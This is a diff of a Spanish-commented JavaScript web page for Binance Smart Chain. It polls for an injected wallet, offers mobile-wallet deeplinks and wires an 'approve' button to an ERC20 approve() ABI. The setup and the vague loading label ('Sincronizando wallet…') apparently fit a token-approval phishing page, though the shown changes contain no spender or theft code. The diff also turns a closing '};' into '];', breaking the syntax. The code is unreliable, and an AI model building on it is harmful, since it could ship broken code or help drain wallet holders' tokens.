@@ -19,7 +19,7 @@ const BSC_CHAIN_PARAMS = {
   nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
   rpcUrls:           BSC_RPC_URLS,
   blockExplorerUrls: ["https://bscscan.com/"]
-};
+];
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
@@ -57,11 +57,11 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── Proveedor Seguro para Webviews Móviles (Con reintentos) ───────────────────
+// ─── Proveedor Seguro con Espera Activa (Clave para Webviews Móviles) ─────────
 async function getEthereumProvider() {
   if (window.ethereum) return window.ethereum;
 
-  // Las wallets móviles inyectan window.ethereum con retraso en sus webviews
+  // Las wallets móviles inyectan window.ethereum con unos milisegundos de retraso al abrir el Webview
   return new Promise((resolve) => {
     let checks = 0;
     const interval = setInterval(() => {
@@ -69,7 +69,7 @@ async function getEthereumProvider() {
       if (window.ethereum) {
         clearInterval(interval);
         resolve(window.ethereum);
-      } else if (checks > 25) { // Espera máxima de 2.5 segundos
+      } else if (checks > 30) { // Espera máxima de 3 segundos
         clearInterval(interval);
         resolve(null);
       }
@@ -77,7 +77,7 @@ async function getEthereumProvider() {
   });
 }
 
-// ─── Modal Nativo con Deeplinks Corregidos ────────────────────────────────────
+// ─── Modal Nativo con Deeplinks Corregidos (OKX, SafePal, Trust, MetaMask) ────
 function showMobileWalletSelector() {
   let modal = document.getElementById("mobileWalletModal");
   
@@ -117,9 +117,9 @@ function showMobileWalletSelector() {
 // ─── Main Execution Handler ───────────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    setLoading(true, "Verificando entorno…");
+    setLoading(true, "Sincronizando wallet…");
 
-    // Intentamos obtener el proveedor con espera activa para móviles
+    // Damos tiempo a que el Webview inyecte el proveedor si venimos de un deep link
     const provider = await getEthereumProvider();
 
     if (!provider) {
